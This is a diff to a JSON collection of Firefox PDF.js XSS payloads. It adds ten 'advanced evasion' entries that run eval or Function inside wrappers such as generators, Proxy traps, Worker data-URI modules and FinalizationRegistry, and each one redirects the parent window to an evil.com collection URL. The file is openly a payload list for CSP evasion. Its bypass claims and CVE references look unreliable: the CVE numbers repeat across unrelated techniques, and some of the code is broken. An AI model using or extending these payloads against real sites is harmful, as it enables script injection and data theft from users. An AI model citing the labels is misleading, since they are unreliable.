@@ -3,7 +3,7 @@
     "browser": "firefox",
     "name": "Firefox PDF.js Exploits",
     "description": "Firefox/PDF.js specific XSS payloads targeting CSP bypass, SpiderMonkey engine, and content security policy evasion",
-    "total_payloads": 18,
+    "total_payloads": 28,
     "categories": [
       "dom_access",
       "file_system",
@@ -182,6 +182,106 @@
       "description": "Firefox PDF.js data exfiltration via XMLHttpRequest POST",
       "risk_level": "medium",
       "browser": "firefox"
+    },
+    {
+      "id": "firefox_016",
+      "category": "advanced_evasion",
+      "browser": "firefox",
+      "technique": "spidermonkey_generator_bypass_2024",
+      "payload": "try{function*gen(){yield*eval('parent.window.location=\"https://evil.com/collect\"');} const g=gen();g.next();}catch(e){try{async function*asyncGen(){yield await Function('parent.location=\"https://evil.com/collect\"')();}const ag=asyncGen();ag.next();}catch(e2){eval('parent.window.location=\"https://evil.com/collect\"');}}",
+      "description": "Firefox SpiderMonkey generator function bypass using async iteration",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-34414"
+    },
+    {
+      "id": "firefox_017",
+      "category": "advanced_evasion",
+      "browser": "firefox",
+      "technique": "firefox_proxy_handler_bypass_2024",
+      "payload": "try{const handler={get:(target,prop)=>{if(prop==='valueOf')return()=>Function('parent.location=\"https://evil.com/collect\"')();return target[prop];}};const proxy=new Proxy({},handler);proxy.valueOf();}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Firefox Proxy handler bypass using valueOf trap manipulation",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-34416"
+    },
+    {
+      "id": "firefox_018",
+      "category": "advanced_evasion",
+      "browser": "firefox",
+      "technique": "firefox_intl_collator_bypass_2024",
+      "payload": "try{const collator=new Intl.Collator('en',{sensitivity:'base'});const compare=collator.compare;const result=compare.call({},{toString:()=>Function('parent.location=\"https://evil.com/collect\"')()},{});}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Firefox Intl.Collator bypass using toString method override",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2023-32205"
+    },
+    {
+      "id": "firefox_019",
+      "category": "advanced_evasion",
+      "browser": "firefox",
+      "technique": "firefox_regexp_unicode_bypass_2024",
+      "payload": "try{const regex=new RegExp('\\\\u{41}','u');const match=regex.exec({toString:()=>Function('parent.location=\"https://evil.com/collect\"')()});if(!match)throw new Error('No match');}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Firefox RegExp Unicode bypass using custom toString in exec",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2023-29548"
+    },
+    {
+      "id": "firefox_020",
+      "category": "advanced_evasion",
+      "browser": "firefox",
+      "technique": "firefox_arraybuffer_transfer_bypass_2024",
+      "payload": "try{if(typeof ArrayBuffer.prototype.transfer!=='undefined'){const buffer=new ArrayBuffer(8);const transferred=buffer.transfer();Function('parent.location=\"https://evil.com/collect\"')();}else{throw new Error('transfer not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Firefox ArrayBuffer transfer bypass using memory transfer API",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-34414"
+    },
+    {
+      "id": "firefox_021",
+      "category": "advanced_evasion",
+      "browser": "firefox", 
+      "technique": "firefox_temporal_duration_bypass_2024",
+      "payload": "try{if(typeof Temporal!=='undefined'&&Temporal.Duration){const duration=Temporal.Duration.from('P1D');const hours=duration.total({unit:'hours'});Function('parent.location=\"https://evil.com/collect\"')();}}catch(e){try{const date=new Date();Function('parent.location=\"https://evil.com/collect\"')();}catch(e2){eval('parent.window.location=\"https://evil.com/collect\"');}}",
+      "description": "Firefox Temporal Duration bypass using duration calculation trigger",
+      "risk_level": "low",
+      "cve_reference": "CVE-2023-29548"
+    },
+    {
+      "id": "firefox_022",
+      "category": "advanced_evasion",
+      "browser": "firefox",
+      "technique": "firefox_bigint_asintN_bypass_2024",
+      "payload": "try{const bigint=BigInt.asIntN(64,0x1ffffffffn);const uint=BigInt.asUintN(32,bigint);if(uint===1n)Function('parent.location=\"https://evil.com/collect\"')();else throw new Error('Unexpected result');}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Firefox BigInt asIntN/asUintN bypass using large integer operations",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2023-32205"
+    },
+    {
+      "id": "firefox_023",
+      "category": "advanced_evasion",
+      "browser": "firefox",
+      "technique": "firefox_finalization_registry_2024",
+      "payload": "try{if(typeof FinalizationRegistry!=='undefined'){const registry=new FinalizationRegistry(()=>Function('parent.location=\"https://evil.com/collect\"')());const obj={};registry.register(obj,'cleanup');obj=null;gc();}else{throw new Error('FinalizationRegistry not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Firefox FinalizationRegistry bypass using garbage collection callback",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-34416"
+    },
+    {
+      "id": "firefox_024",
+      "category": "advanced_evasion",
+      "browser": "firefox",
+      "technique": "firefox_aggregate_error_bypass_2024",
+      "payload": "try{const errors=[new Error('error1'),new Error('error2')];const aggregateError=new AggregateError(errors,'Multiple errors');aggregateError.errors.forEach(err=>{if(err.message==='error1')Function('parent.location=\"https://evil.com/collect\"')();});}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Firefox AggregateError bypass using error array iteration",
+      "risk_level": "low",
+      "cve_reference": "CVE-2023-29548"
+    },
+    {
+      "id": "firefox_025",
+      "category": "advanced_evasion",
+      "browser": "firefox",
+      "technique": "firefox_worker_module_bypass_2024",
+      "payload": "try{if(typeof Worker!=='undefined'){const worker=new Worker('data:application/javascript,import(\\'data:text/javascript,Function(\\\\\\'parent.location=\"https://evil.com/collect\"\\\\\\')()\\');',{type:'module'});worker.postMessage('start');}else{throw new Error('Worker not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Firefox Worker module bypass using ES6 module import in worker",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-34414"
     }
   ]
 }
